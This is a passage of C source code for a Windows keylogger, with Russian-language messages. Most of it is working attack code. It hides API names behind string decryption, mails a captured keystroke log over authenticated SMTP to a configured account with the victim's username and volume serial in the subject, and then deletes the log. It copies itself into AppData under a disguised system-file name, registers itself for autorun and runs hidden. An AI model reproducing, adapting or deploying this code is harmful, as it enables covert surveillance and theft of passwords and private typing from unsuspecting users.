		CheckKey(VK_NUMPAD7);
		CheckKey(VK_NUMPAD8);
		CheckKey(VK_NUMPAD9);
		CheckKey(VK_MULTIPLY);
		CheckKey(VK_ADD);
		CheckKey(VK_SUBTRACT);
		CheckKey(VK_DECIMAL);
		CheckKey(VK_DIVIDE);
		CheckKey(VK_OEM_1);
		CheckKey(VK_OEM_PLUS);
		CheckKey(VK_OEM_COMMA);
		CheckKey(VK_OEM_MINUS);
		CheckKey(VK_OEM_PERIOD);
		CheckKey(VK_OEM_2);
		CheckKey(VK_OEM_3);
		CheckKey(VK_OEM_4);
		CheckKey(VK_OEM_5);
		CheckKey(VK_OEM_6);
		CheckKey(VK_OEM_7);
	}
	return 1;
}

PVOID DecryptDllAndAPI(LPBYTE szDllName, LPBYTE szApiName)
{
	char tmpbuffer[300];
	
	DecryptString(szDllName, tmpbuffer);
	hModule = LoadLibrary(tmpbuffer);
	DecryptString(szApiName, tmpbuffer);
	return GetProcAddress(hModule, tmpbuffer);
}

int send(SOCKET hSocket, LPSTR buffer)
{
	int nByte;
	char tmpbuffer[8];

	int sizebuffer = lstrlen(buffer);
	DecryptString(csSend, tmpbuffer); // "send"
	fnsend = (psend)GetProcAddress(hModule, tmpbuffer);
	nByte = fnsend(hSocket, buffer, sizebuffer, 0);
	Sleep(1);
#ifdef OUTDEBUG
	DebugPrintfA(FALSE, "send: nByte = %d; buffer = %s", nByte, buffer);
#endif
	return nByte;
}

//If no error occurs, recv returns the number of bytes received. 
//If the connection has been gracefully closed, the return value is zero. 
//Otherwise, a value of SOCKET_ERROR is returned, and a specific error code can be retrieved by calling WSAGetLastError.
int recv(SOCKET hSocket)
{
	int nByte;
	char tmpbuffer[8];

	DecryptString(csRecv, tmpbuffer); // "recv"
	fnrecv = (precv)GetProcAddress(hModule, tmpbuffer);
	Sleep(1);
	nByte = fnrecv(hSocket, szReply, 255, 0);
#ifdef OUTDEBUG
	DebugPrintfA(FALSE, "recv: nByte = %d; buffer = %s", nByte, &szReply);
#endif
	return nByte;
}

DWORD ThreadSendMail(LPVOID lpParameter)
{
	char tmpbuffer[300];
	
	while(TRUE)
	{
		iPartProgress32 = 1;
		flagAuthorized = 0;
		FileSize = 0;
		bSendMail = FALSE;
		Sleep(5000);

		//fnInternetGetConnectedState = (pInternetGetConnectedState)DecryptDllAndAPI(csWininet_dll, csInternetGetConnectedState);
		//flagInternetConnectedState = fnInternetGetConnectedState(NULL, 0);
		//FreeLibrary(hModule);
		//if(flagInternetConnectedState != TRUE)
		//{
		//	iError = iPartProgress32;
		//	bTestMode = FALSE;
		//	iPartProgress32 = 0;
		//	return 1;
		//}
		if(!bTestMode)
		{
			GenerateFileNameNSysDat();
			Sleep(140);
			if(!lstrlen(szLastPathToNSysDat))
			{
				goto L_EXIT;
			}
			hFileLogn = CreateFile(szLastPathToNSysDat, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
			if(hFile == INVALID_HANDLE_VALUE)
			{
				goto L_EXIT;
			}
			FileSize = GetFileSize(hFileLogn, NULL);
			hMem = GlobalAlloc(GMEM_ZEROINIT|GMEM_MOVEABLE, FileSize);
			lpBuffer = GlobalLock(hMem);
			ReadFile(hFileLogn, lpBuffer, FileSize, &FileSize, NULL);
			CloseHandle(hFileLogn);
			szMessage = (LPSTR)lpBuffer;
		}

		iPartProgress32 = 1;
		
		DecryptString(csMail, szMail); // "E-Mail"
		LPSTR p = strchr(szMail, '@');
		int sizeMailLogin = p-szMail+1;
		lstrcpyn(szMailLogin, szMail, sizeMailLogin);
		p++;
		lstrcpyn(szMailHost, p, lstrlen(szMail)-sizeMailLogin+1);
#ifdef OUTDEBUG
		DebugPrintfA(FALSE, "szMailLogin = %s", &szMailLogin);
		DebugPrintfA(FALSE, "szMailHost = %s", &szMailHost);
#endif
		
		//asmConstString[0] = 0x70746D73; asmConstString[1] = 0x2E; // "smtp."
		//lstrcpy(szMailServer, (LPSTR)asmConstString);
		//lstrcat(szMailServer, szMailHost); // example: "smtp.mail.ru"
		DecryptString(csMailServer, szMailServer); // example: "smtp.mail.ru"
#ifdef OUTDEBUG
		DebugPrintfA(FALSE, "szMailServer = %s", &szMailServer);
#endif

		asmConstString[0] = 0x54504352; asmConstString[1] = 0x3A4F5420; asmConstString[2] = 0x3C; // "RCPT TO:<"
		lstrcpy(szRcptTo, (LPSTR)&asmConstString);
		lstrcat(szRcptTo, szMail);
		asmConstString[0] = 0x0A0D3E; // ">\r\n"
		lstrcat(szRcptTo, (LPSTR)&asmConstString); // example: "RCPT TO:<login@mail.ru>\r\n"
#ifdef OUTDEBUG
		DebugPrintfA(FALSE, "szRcptTo = %s", &szRcptTo);
#endif

		asmConstString[0] = 0x4C49414D; asmConstString[1] = 0x4F524620; asmConstString[2] = 0x4D; // "MAIL FROM"
		lstrcpy(szMailFrom, (LPSTR)&asmConstString);
		asmConstString[0] = 0x3C203A; // ": <"
		lstrcat(szMailFrom, (LPSTR)&asmConstString);
		lstrcat(szMailFrom, szMail);
		asmConstString[0] = 0x0A0D3E; // ">\r\n"
		lstrcat(szMailFrom, (LPSTR)&asmConstString); // example: "MAIL FROM: <login@mail.ru>\r\n"
#ifdef OUTDEBUG
		DebugPrintfA(FALSE, "szMailFrom = %s", &szMailFrom);
#endif

		asmConstString[0] = 0x4D4F5246; asmConstString[1] = 0x3C203A; // "FROM: <"
		lstrcpy(szFrom, (LPSTR)&asmConstString);
		lstrcat(szFrom, szMail);
		asmConstString[0] = 0x0A0D3E; // ">\r\n"
		lstrcat(szFrom, (LPSTR)&asmConstString); // example: "FROM: <login@mail.ru>\r\n"
#ifdef OUTDEBUG
		DebugPrintfA(FALSE, "szFrom = %s", &szFrom);
#endif

		asmConstString[0] = 0x203A4F54; asmConstString[1] = 0x3C; // "TO: <"
		lstrcpy(szTo, (LPSTR)&asmConstString);
		lstrcat(szTo, szMail);
		asmConstString[0] = 0x0A0D3E; // ">\r\n"
		lstrcat(szTo, (LPSTR)&asmConstString); // example: "TO: <login@mail.ru>\r\n"
#ifdef OUTDEBUG
		DebugPrintfA(FALSE, "szTo = %s", &szTo);
#endif
		Sleep(1500);
		//++nouse_40709F;

		//fnInternetGetConnectedState = (pInternetGetConnectedState)DecryptDllAndAPI(csWininet_dll, csInternetGetConnectedState);
		//flagInternetConnectedState = fnInternetGetConnectedState(NULL, 0);
		//FreeLibrary(hModule);
		//if(flagInternetConnectedState != TRUE)
		//{
		//	Sleep(1500);
		//	goto L_EXIT;
		//}
		WSADATA WSAData;
		fnWSAStartup = (pWSAStartup)DecryptDllAndAPI(csWsock32_dll, csWSAStartup); // "wsock32.dll" "WSAStartup"
		if(!fnWSAStartup(MAKEWORD(1, 1), &WSAData)) //!? MAKEWORD(2, 2)
		{
			SOCKET hSocket;
			DecryptString(csSocket, tmpbuffer); // "socket"
			fnsocket = (psocket)GetProcAddress(hModule, tmpbuffer);
			hSocket = fnsocket(AF_INET, SOCK_STREAM, IPPROTO_IP);
			if(hSocket != INVALID_SOCKET) 
			{
				sockaddr_in service;
				service.sin_family = AF_INET;
				DecryptString(csHtons, tmpbuffer); // "htons"
				fnhtons = (phtons)GetProcAddress(hModule, tmpbuffer);
				service.sin_port = fnhtons(25);
				DecryptString(csGethostbyname, tmpbuffer); // "gethostbyname"
				fngethostbyname = (pgethostbyname)GetProcAddress(hModule, tmpbuffer);
				hostent *h = fngethostbyname(szMailServer);
#ifdef OUTDEBUG
				DebugPrintfA(FALSE, "gethostbyname = %p", h);
#endif
				if(h)
				{
					DWORD inetaddr;
					inetaddr = *((DWORD *)h->h_addr_list[0]);
#ifdef OUTDEBUG
					DebugPrintfA(FALSE, "inetaddr = %p", inetaddr);
#endif
					service.sin_addr.s_addr = inetaddr;
					DecryptString(csConnect, tmpbuffer); // "connect"
					fnconnect = (pconnect)GetProcAddress(hModule, tmpbuffer);
					if(fnconnect(hSocket, (struct sockaddr *)&service, sizeof(sockaddr_in)) != -1) // Connecting...
					{
						recv(hSocket);
						Sleep(500);
						Sleep(500);
						
						asmConstString[0] = 0x4F4C4845; asmConstString[1] = 0x72657320; asmConstString[2] = 0x0D726576; 
						asmConstString[3] = 0x0A; // "EHLO server\r\n"
						send(hSocket, (LPSTR)&asmConstString);
						recv(hSocket);
						Sleep(500);
						
						iPartProgress32 = 2;
						asmConstString[0] = 0x48545541; asmConstString[1] = 0x474F4C20; asmConstString[2] = 0x0A0D4E49; 
						asmConstString[3] = 0x0;  // "AUTH LOGIN\r\n"
						lstrcpy(szAuthLogin, (LPSTR)&asmConstString);
						send(hSocket, szAuthLogin);
						
						iPartProgress32 = 3;
						recv(hSocket);
						Sleep(500);
						
						char szBase64[256]; 
						base64_encode((BYTE *)&szMailLogin, (BYTE *)&szBase64, lstrlen(szMailLogin));
						lstrcpy(szAuthLogin, szBase64);
						lstrcat(szAuthLogin, "\r\n");
						send(hSocket, szAuthLogin);
						recv(hSocket);

						DecryptString(csMailPass, tmpbuffer); // "Password"
						base64_encode((BYTE *)&tmpbuffer, (BYTE *)&szBase64, lstrlen(tmpbuffer));
						lstrcpy(szAuthLogin, szBase64);
						lstrcat(szAuthLogin, "\r\n");
						send(hSocket, szAuthLogin);
						recv(hSocket);

						lstrcpyn(szReplyCode, szReply, 4);
						asmConstString[0] = 0x353332; // "235"
						if(!lstrcmp(szReplyCode, (LPSTR)&asmConstString)) // 235 Authentication successful
						{
							flagAuthorized = TRUE;
							send(hSocket, szMailFrom);
							iPartProgress32 = 4;
							recv(hSocket);
							Sleep(500);
							send(hSocket, szRcptTo);
							iPartProgress32 = 5;
							recv(hSocket);
							asmConstString[0] = 0x41544144; asmConstString[1] = 0x0A0D; // "DATA\r\n"
							send(hSocket, (LPSTR)&asmConstString);
							iPartProgress32 = 6;
							recv(hSocket);
							Sleep(500);
							send(hSocket, szFrom);
							iPartProgress32 = 7;
							send(hSocket, szTo);
							iPartProgress32 = 8;
							asmConstString[0] = 0x4A425553; asmConstString[1] = 0x3A544345; asmConstString[2] = 0x20; // "SUBJECT: "
							lstrcpy(szSubject, (LPSTR)&asmConstString);
							if(!lstrlen(szUserName))
								GetUserName(szUserName, &sizeUserName);
							lstrcat(szSubject, szUserName);
							lstrcat(szSubject, "/");
							if(!lstrlen(szVolumeSerialNumber))
							{
								GetVolumeInformation(NULL, NULL, 0, &VolumeSerialNumber, NULL, NULL, NULL, 0);
								wsprintf(szVolumeSerialNumber, "%X", VolumeSerialNumber);
							}
							lstrcat(szSubject, szVolumeSerialNumber);
							lstrcat(szSubject, "\r\n");
							send(hSocket, szSubject);
							iPartProgress32 = 9;

							asmConstString[0] = 0x656D694D; asmConstString[1] = 0x7265562D; asmConstString[2] = 0x6E6F6973; 
							asmConstString[3] = 0x2E31203A; asmConstString[4] = 0x0A0D30; // "Mime-Version: 1.0\r\n"
							send(hSocket, (LPSTR)&asmConstString);

							iPartProgress32 = 10;
							asmConstString[0] = 0x746E6F43; asmConstString[1] = 0x2D746E65; asmConstString[2] = 0x65707974; 
							asmConstString[3] = 0x6574203A; asmConstString[4] = 0x702F7478; asmConstString[5] = 0x6E69616C; 
							asmConstString[6] = 0x6863203B; asmConstString[7] = 0x65737261; asmConstString[8] = 0x77223D74; 
							asmConstString[9] = 0x6F646E69; asmConstString[10] = 0x312D7377; asmConstString[11] = 0x22313532; 
							asmConstString[12] = 0x0A0D; // "Content-type: text/plain; charset="windows-1251"\r\n"
							send(hSocket, (LPSTR)&asmConstString);

							iPartProgress32 = 11;
							if(FileSize || bTestMode)
							{
								if(bTestMode)
								{
									FileSize = lstrlen(szMessage);
								}
								DecryptString(csSend, tmpbuffer); // "send"
								fnsend = (psend)GetProcAddress(hModule, tmpbuffer);
								fnsend(hSocket, szMessage, FileSize, 0);
#ifdef OUTDEBUG
								DebugPrintfA(FALSE, "szMessage = %s", szMessage);
#endif
							}
							//asmConstString[0] = 0x0A0D2E0A; asmConstString[1] = 0x0D; //!?
							asmConstString[0] = 0x0D2E0A0D; asmConstString[1] = 0x0A; // "\r\n.\r\n"
							send(hSocket, (LPSTR)&asmConstString);

							iPartProgress32 = 12;
							recv(hSocket);
							lstrcpyn(szReplyCode, szReply, 4);
							asmConstString[0] = 0x303532; // "250"
							if(!lstrcmp(szReplyCode, (LPSTR)&asmConstString)) // 250 OK
							{
								bSendMail = TRUE;
								asmConstString[0] = 0x54495551; asmConstString[1] = 0x0A0D; // "QUIT\r\n"
								send(hSocket, (LPSTR)&asmConstString);
								recv(hSocket);
							}
						}
					}
				}
				DecryptString(csClosesocket, tmpbuffer); // "closesocket"
				fnclosesocket = (pclosesocket)GetProcAddress(hModule, tmpbuffer);
				fnclosesocket(hSocket);
				FreeLibrary(hModule);
			}
		}
L_EXIT:
		if(bTestMode) break;
		szMessage = NULL;
		GlobalUnlock(lpBuffer);
		GlobalFree(hMem);
		if(!bSendMail) break;
		DeleteFileA(szLastPathToNSysDat);
	}
	iError = iPartProgress32;
	bTestMode = FALSE;
	iPartProgress32 = 0;
	Sleep(100);
	return 1;
}

DWORD ThreadSetProgress32(LPVOID lpParameter)
{
	char tmpbuffer[300];
	iError = 0;

	while(TRUE)
	{
		if(!iPartProgress32)
			break;
		if(iPartProgress32 == 1)
			SendMessage(hProgress32, PBM_SETPOS, 8, 0);
		if(iPartProgress32 == 2)
			SendMessage(hProgress32, PBM_SETPOS, 17, 0);
		if(iPartProgress32 == 3)
			SendMessage(hProgress32, PBM_SETPOS, 25, 0);
		if(iPartProgress32 == 4)
			SendMessage(hProgress32, PBM_SETPOS, 33, 0);
		if(iPartProgress32 == 5)
			SendMessage(hProgress32, PBM_SETPOS, 42, 0);
		if(iPartProgress32 == 6)
			SendMessage(hProgress32, PBM_SETPOS, 50, 0);
		if(iPartProgress32 == 7)
			SendMessage(hProgress32, PBM_SETPOS, 58, 0);
		if(iPartProgress32 == 8)
			SendMessage(hProgress32, PBM_SETPOS, 67, 0);
		if(iPartProgress32 == 9)
			SendMessage(hProgress32, PBM_SETPOS, 75, 0);
		if(iPartProgress32 == 10)
			SendMessage(hProgress32, PBM_SETPOS, 83, 0);
		if(iPartProgress32 == 11)
			SendMessage(hProgress32, PBM_SETPOS, 92, 0);
		if(iPartProgress32 == 12)
			SendMessage(hProgress32, PBM_SETPOS, 100, 0);
		Sleep(3); // avoid 100% cpu usage
	}
	switch(iError)
	{
		case 1:
		{
			DecryptString(csNoConnect, tmpbuffer); // "Пожалуйста подключи интернет."
			MessageBox(hDlgTest, tmpbuffer, "", MB_OK);
			break;
		}
		case 3:
		{
			DecryptString(csErrorAuthorization, tmpbuffer); // "Не удалось авторизоваться! Проверь E-Mail и пароль."
			MessageBox(hDlgTest, tmpbuffer, "", MB_OK);
			break;
		}
		case 12:
		{
			if(!bSendMail)
			{
				DecryptString(csNoSendMessage, tmpbuffer); // "Тестовое сообщение не отправлено! Попробуй снова или измени E-Mail и пароль."
				MessageBox(hDlgTest, tmpbuffer, "", MB_OK);
			} 
			else
			{
				DecryptString(csGoodTest, tmpbuffer); // "Тестовое сообщение отправлено!"
				MessageBox(hDlgTest, tmpbuffer, "", MB_OK);
			}
			break;
		}
	}
	SendMessage(hDlgTest, WM_CLOSE, 0, 0);
	return 1;
}

int CALLBACK DlgTestProc(HWND hDlg, UINT Message, WPARAM wParam, LPARAM lParam)
{
	char tmpbuffer[300];
	
	switch(Message)
	{
		case WM_INITDIALOG:
		{
			hDlgTest = hDlg;
			hProgress32 = GetDlgItem(hDlg, ID_PROGRESS32);
			DecryptString(csKeyloggerDetective, tmpbuffer); // "Keylogger Detective"
			SetWindowText(hDlg, tmpbuffer);
			bTestMode = TRUE;
			DecryptString(csTestMessage, szTestMessage); // "Тестовое сообщение. Если ты читаешь этот текст, значит кейлоггер работает.\r\n"
			szMessage = szTestMessage;
			CreateThread(NULL, 0, ThreadSendMail, NULL, NORMAL_PRIORITY_CLASS, &thSendMail);
			CreateThread(NULL, 0, ThreadSetProgress32, NULL, NORMAL_PRIORITY_CLASS, &thSetProgress32);
			break;
		}
		case WM_CLOSE:
		{
			EndDialog(hDlg, NULL);
			break;
		}
	}
	return FALSE;
}

void Main()
{
	LPWSTR *szArglist;
	int nArgs;

	szArglist = CommandLineToArgvW(GetCommandLineW(), &nArgs);
	if(NULL == szArglist)
	{
		//DebugPrintfA(TRUE, "CommandLineToArgvW failed\n");
		//return;
	}
	else 
	{
		//for(int i=0; i<nArgs; i++) 
		//{
		//	DebugPrintfA(FALSE, "%d: %ws\n", i, szArglist[i]);
		//}
		if(nArgs > 1)
		{
			if(!wcscmp(szArglist[1], L"-test"))
			{
				LocalFree(szArglist);
				DialogBoxParam(GetModuleHandle(NULL), MAKEINTRESOURCE(DLG_TEST), NULL, (DLGPROC)DlgTestProc, 0);
				ExitProcess(0);
				return;
			}
			
		}
	}
	LocalFree(szArglist);
	
	DWORD dwType;
	GetModuleFileName(NULL, szFileName, MAX_PATH);
	lstrcpy(szDirKD, szFileName);
	PathRemoveFileSpec(szDirKD);
	RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders", 0, REG_SZ, &hRegKey);
	RegQueryValueEx(hRegKey, "AppData", NULL, &dwType /*can be NULL*/, (LPBYTE)&szPathAppDataSysdata, &Size);
	RegCloseKey(hRegKey);
	lstrcat(szPathAppDataSysdata, "\\"Sysdata);

	CreateMutex(NULL, FALSE, "Detectivem"); //!? rename "Detectivem"
	if(GetLastError() != ERROR_ALREADY_EXISTS)
	{
		if(lstrcmpi(szDirKD, szPathAppDataSysdata))
		{
			DropKDToAppData();
			Sleep(2500);
			AddKDToAutoRun();
			ShellExecute(NULL, NULL, szPathAppDataSysdataToSyssvcExe, NULL, NULL, SW_HIDE);
		} 
		else
		{
			lstrcpy(szPathAppDataSysdataToSysDat, szFileName);
			PathRemoveFileSpec(szPathAppDataSysdataToSysDat);
			lstrcat(szPathAppDataSysdataToSysDat, "\\"SysDat);
			CreateThread(NULL, 0, ThreadWriteLog, NULL, NORMAL_PRIORITY_CLASS, &thWriteLog);
			CreateThread(NULL, 0, ThreadKeyLogging, NULL, NORMAL_PRIORITY_CLASS, &thKeyLogging); 
			MsgWaitForMultipleObjects(0, NULL, FALSE, INFINITE, QS_HOTKEY);
		}
	}
	ExitProcess(0);
	return;
}// end « Main »

//int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
//{
//	return 1;
//}